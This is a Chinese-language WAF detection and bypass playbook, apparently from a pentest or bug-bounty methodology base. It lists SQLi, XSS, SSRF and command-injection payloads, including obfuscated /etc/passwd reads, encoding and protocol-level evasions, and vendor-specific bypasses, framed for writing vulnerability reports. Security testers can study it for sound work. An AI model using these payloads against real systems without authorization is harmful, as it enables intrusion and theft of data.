# WAF 诊断与绕过协议

> **CWE**: 20(输入验证不当) / 693(防护机制失效)
> **定位**: 横切关注点。WAF 绕过本身不是独立漏洞，它是让其他漏洞(注入类)可利用的手段。
> **产出**: 被绕过后漏洞的攻击请求，经验证后写入最终漏洞报告的复现步骤。

---

## §0 First-pass: WAF 检测 + 指纹识别

### 0.1 多上下文探测

```
对目标发送以下 4 种探测 payload, 观察响应:
├─ SQLi: id=1' AND 1=1--          → 403/拦截页 = WAF 存在
├─ XSS:  id="><script>a</script>   → 403/拦截页 = WAF 存在
├─ SSRF: url=http://127.0.0.1     → 403/拦截页 = WAF 存在
└─ CMDi: cmd=;whoami              → 403/拦截页 = WAF 存在
```

### 0.2 WAF 指纹表

> 识别 WAF 类型 → 选择对应绕过策略。

| 拦截特征 | WAF 类型 | 后续策略 |
|----------|----------|----------|
| 403 + `Server: cloudflare` / `cf-ray:` header | Cloudflare | §5.1 |
| 403 + `<title>Sorry, you have been blocked</title>` | Cloudflare Managed Challenge | §5.1 |
| 403/405 + 响应 body 含 `Aliyun` / `acs:***` | 阿里云 WAF | §5.2 |
| 403 + 响应 body 含 `safeline` / `SafeLine` | SafeLine(雷池) | §5.3 |
| 403 + `X-Amz-Cf-Id` / `X-Amzn-Trace-Id` | AWS WAF / CloudFront | §5.4 |
| 403 + `Server: Mod_Security` / `ModSecurity` | ModSecurity (CRS) | §2 编码链 |
| 403 + `X-Protected-By: IBM` | IBM WAF | §2 编码链 |
| 403 + `Server: Imperva` / `X-CDN: Incapsula` | Imperva/Incapsula | §3 协议层 |
| 拦截页含 `Access Denied` + 无特征 header | 通用 WAF | §0.3 + 逐层尝试 |
| 自定义拦截页 (公司名+安全) | 自研 WAF | §2+§3+§4 逐层尝试 |

### 0.3 wafw00f 输出解读

```bash
wafw00f https://target.com
```

```
关键输出:
  "The site XXX is behind a [WAF Name] WAF"
  → 取 WAF Name 查 §0.2 指纹表 → 选对应策略章节

  "No WAF detected"
  → 可能无 WAF, 也可能是云 WAF(CDN 层)未暴露特征
  → 仍用 §0.1 探测 payload 确认
```

---

## §1 [Decision Card] 多上下文路由

> 旧版只路由 SQLi。WAF 拦截发生在所有注入场景，必须按上下文分流。

```
确认 WAF 存在 (§0.1 任一 payload 返回拦截)
    ↓
确认 WAF 类型 (§0.2 指纹表)
    ↓
根据被拦截的漏洞类型选路由:
├─ SQLi 被拦 → §2 编码链 + §4 逻辑层
├─ XSS 被拦  → §2 标签/事件替换 + §3 协议层
├─ SSRF 被拦 → §2 IP 编码 + §4 逻辑层
├─ CMDi 被拦 → §2 命令替换 + §3 协议层
└─ 通用      → §2 → §3 → §4 → §5 逐层尝试
```

---

## §2 [Encoding-Chain] 编码链协议

> 每个编码技术给出"原请求 → 改造后请求"对比。改造后的请求经验证有效后，直接用于漏洞报告复现步骤。

### 2.1 双重 URL 编码

服务器解码一层，WAF 只检查原始输入。

```
原 payload:  1' AND 1=1--
编码后:      1%2527%2520AND%25201%253D1--
解码过程:    %2527 → %27 → '  (WAF 看到的是编码态, 服务器解码后执行)
```

XSS 场景:
```
原 payload:  <script>alert(1)</script>
编码后:      %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
```

### 2.2 Unicode 等价字符

某些 WAF 做 unicode 标准化后检查，但服务器保留原始字符执行。

```
SQLi:  SELECT → ＳELECT (全角 S, U+FF33)
       SELECT → ſELECT (长 s, U+017F, MySQL 会标准化为 s)
XSS:   <script> → ＜script＞ (全角尖括号, 某些渲染引擎会转换)
```

### 2.3 HTML 实体编码

适用于 XSS 场景，浏览器渲染时会解码 HTML 实体。

```
原 payload:  <img src=x onerror=alert(1)>
编码后:      <img src=x onerror=&#97;lert(1)>
             <img src=x onerror=&#x61;lert(1)>
             <img src=x onerror=&NewLine;alert(1)>
```

### 2.4 %00 截断

某些 WAF 按 `\x00` 截断检查，但服务器处理完整输入。

```
SQLi:  1'%00 AND 1=1--
XSS:   <scr%00ipt>alert(1)</script>
路径:  /admin%00/../secret
```

### 2.5 注释拆分

WAF 匹配关键词，在关键词中间插入注释/空白可破坏匹配。

```
SQLi:  SEL/**/ECT * FR/**/OM users
       SEL%09ECT (Tab 分隔)
       SEL%0AECT (换行分隔)

XSS:   <scr<!---->ipt>alert(1)</script>
       <svg/onload=alert(1)>  (用 / 代替空格)
```

### 2.6 IP 编码 (SSRF 场景)

```
127.0.0.1 的等价写法:
├─ 0177.0.0.1          (八进制)
├─ 0x7f000001          (十六进制)
├─ 2130706433          (十进制整数)
├─ 017700000001        (八进制整数)
├─ 127.1               (缩写)
├─ 127.0.1             (缩写)
├─ 0                   (某些系统解析为 127.0.0.1)
├─ [::1]               (IPv6 loopback)
├─ 0:0:0:0:0:0:0:1     (IPv6 完整)
└─ 127.0.0.1           (DNS 解析: localtest.me / make-america-pentestable-again.com)
```

### 2.7 命令替换 (CMDi 场景)

```
被拦:  ; cat /etc/passwd
替换:  ; c'a't /etc/passwd        (单引号插入, bash 忽略)
       ; c""at /etc/passwd         (双引号插入)
       ; /bin/c''at /etc/passwd    (绝对路径 + 引号)
       ; cat$@ /etc/passwd         (bash 特殊变量 $@ 为空)
       ; {cat,/etc/passwd}         (bash brace expansion)
       ; cat${IFS}/etc/passwd      ($IFS 替代空格)
       ; cat</etc/passwd           (重定向替代空格)
```

### 2.8 编码组合策略

单层绕不过时组合多层。优先级：

```
1. 双重 URL 编码 + 注释拆分  (最常用, 成功率高)
2. Unicode 等价 + 注释拆分     (对中文 WAF 有效)
3. 协议层(chunked) + 编码      (§3 配合 §2)
4. 参数污染 + 编码              (§4 配合 §2)
```

---

## §3 协议层绕过

> 利用 HTTP 协议解析差异，使 WAF 和服务器对同一请求的理解不同。

### 3.1 分块传输 (Transfer-Encoding: chunked)

WAF 可能不解析 chunked body，直接放行。

```bash
# SQLi via chunked
curl -X POST https://target.com/api \
  -H "Transfer-Encoding: chunked" \
  -d "1\r\n'\r\n1\r\n AND 1=1--\r\n0\r\n\r\n"
```

工具辅助: Burp 的 `Chunked coding plugin` 可自动转换。

### 3.2 Content-Type 切换

WAF 可能只检查特定 Content-Type 的 body。

```
原请求:  Content-Type: application/x-www-form-urlencoded
         id=1' AND 1=1--

尝试 1:  Content-Type: application/json
         {"id":"1' AND 1=1--"}

尝试 2:  Content-Type: multipart/form-data
         ------boundary
         Content-Disposition: form-data; name="id"
         1' AND 1=1--
         ------boundary--

尝试 3:  Content-Type: text/xml
         <id>1' AND 1=1--</id>
```

### 3.3 HTTP/2 多路复用

部分 WAF 不支持 HTTP/2，降级到 HTTP/1.1 后 WAF 规则失效。

```
curl --http2 https://target.com/api -d "id=1' AND 1=1--"
```

### 3.4 Multipart 解析差异

WAF 和服务器对 multipart boundary 解析可能不同。

```
------boundary_with_special_chars
Content-Disposition: form-data; name="id"

1' AND 1=1--
------boundary_with_special_chars--
```

某些 WAF 按 boundary 切割失败会跳过 body 检查。

---

## §4 逻辑层绕过

> 不改 payload 内容，改请求结构使 WAF 理解出错。

### 4.1 HPP 参数污染

```
原请求:  ?id=1' AND 1=1--
污染后:  ?id=1&id=1' AND 1=1--

服务器取值差异:
├─ PHP/Apache:     取最后一个 → 1' AND 1=1--  (WAF 可能只查第一个)
├─ ASP.NET/IIS:    取最后一个 → 同上
├─ Tomcat:         取第一个   → 1 (WAF 可能只查第二个)
└─ Node.js/Express: 取第一个 → 1
```

### 4.2 JSON 键值位置变换

```json
// 原请求 (WAF 匹配 "password" 键附近的注入)
{"username":"admin","password":"1' AND 1=1--"}

// 变换 1: 键值对调 (某些 WAF 只检查固定位置)
{"password":"1' AND 1=1--","username":"admin"}

// 变换 2: 嵌套 (WAF 可能不深入解析)
{"user":{"name":"admin","pass":"1' AND 1=1--"}}

// 变换 3: 重复键 (JSON 解析器通常取最后一个)
{"username":"admin","username":"1' AND 1=1--"}
```

### 4.3 路径混淆

```
原始:  /api/user?id=1' AND 1=1--
混淆1: /api/./user?id=1' AND 1=1--
混淆2: /api/user;jsessionid=xxx?id=1' AND 1=1--
混淆3: /api/user?id=1' AND 1=1--&_=timestamp (加无用参数干扰)
混淆4: /API/USER?id=1' AND 1=1-- (大小写, 某些路由不区分)
```

---

## §5 厂商特定绕过

### 5.1 Cloudflare

| 技术 | 说明 |
|------|------|
| `%0a` 换行绕过 | 部分规则未处理换行: `1'%0aAND%0a1=1--` |
| 大小写混合 | `<ScRiPt>` 某些规则集不匹配 |
| JSONP 回调 | 可加载同域 JSONP 绕过 CSP + WAF |
| `cf-connecting-ip` | 某些后端信任此 header 做访问控制 |
| Managed Rules 绕过 | 在 WAF 规则和 Origin 之间加额外 header 可触发不同处理路径 |

### 5.2 阿里云 WAF

| 技术 | 说明 |
|------|------|
| Unicode 标准化差异 | WAF 标准化后检查，但部分后端保留原始: `％0027` (全角%) |
| 超长 body 截断 | WAF 有 body 长度限制, 超过部分不检查: 前面填充垃圾 + 末尾放 payload |
| 分块传输 | chunked body 阿里云 WAF 部分版本不解析 |
| JSON 嵌套 | 深层嵌套的 JSON 值可能不在 WAF 检查范围内 |

### 5.3 SafeLine (雷池)

| 技术 | 说明 |
|------|------|
| 同形字 (Homoglyph) | 用视觉相似字符: `ѕ` (Cyrillic s, U+0455) 替代 `s` |
| 语义分析绕过 | 构造在语义上无害但执行等价的表达式 |
| 分块传输 | 部分版本不解析 chunked body |
| 编码组合 | 双重 URL 编码 + Unicode 替换组合使用 |

### 5.4 AWS WAF

| 技术 | 说明 |
|------|------|
| Regex pattern 限制 | AWS WAF regex 有 200 字符限制, 超长 payload 超出规则范围 |
| 规则组优先级 | Allow 规则优先于 Block, 找到可匹配的 Allow 特征 |
| 大小写 + 编码 | AWS WAF 的 regex 默认不区分大小写, 但 byte-match 区分 |
| 标签聚合 | 多请求分散 payload, 单请求不触发阈值 |

---

## §6 复现报告集成指南

> WAF 绕过不单独出报告。绕过后的真实漏洞才出报告。

### 6.1 报告写法

```
标题: 写漏洞本身 (如 "SQL注入"), 不写 "WAF绕过"
复现步骤: 用绕过后的请求包 (经验证有效的那个)
备注 (可选): "目标部署了 XX WAF, 需使用 XX 编码方式绕过才能触发漏洞"
```

### 6.2 验证流程

```
构造绕过请求 → 发送验证 → 确认漏洞触发
    ↓ 成功
经验证的请求包 → 写入报告复现步骤
    ↓ 失败
换下一层绕过策略 (§2 → §3 → §4 → §5)
    ↓ 全部失败
记录 [WAF_Blocked] 到 assets.md, 转其他漏洞向量
```

---

## §7 False Positive 检查

| 现象 | 可能是 FP | 验证方法 |
|------|----------|----------|
| 所有请求都返回 403 | 非目标资产 / IP 被封 | 用普通 GET 请求测试，正常页面也 403 则非 WAF |
| 绕过后无漏洞特征 | WAF 绕过成功但参数本身无漏洞 | 确认绕过后 payload 是否真的生效(如 SQL 报错/XSS 弹窗) |
| 只在特定 Content-Type 下绕过 | 应用只接受该 Content-Type | 确认是 WAF 绕过而非正常功能 |
| chunked 发送后响应 400 | 服务器不支持 chunked | 换其他绕过方式，非 WAF 绕过失败而是协议不支持 |

---

## §8 相关参考

- SQLi 深度 → [vuln/sqli.md](vuln/sqli.md) + [vuln/sqli-scenarios.md](vuln/sqli-scenarios.md)
- XSS 深度 → [vuln/xss.md](vuln/xss.md) + [vuln/xss-scenarios.md](vuln/xss-scenarios.md)
- SSRF 深度 → [vuln/ssrf.md](vuln/ssrf.md) + [vuln/ssrf-scenarios.md](vuln/ssrf-scenarios.md)
- HPP 深度 → [vuln/hpp.md](vuln/hpp.md)
- 请求走私 → [vuln/request-smuggling.md](vuln/request-smuggling.md)
- 工具用法 (wafw00f) → [tool-usage.md](tool-usage.md)
- 报告模板 → [report-template.md](report-template.md)
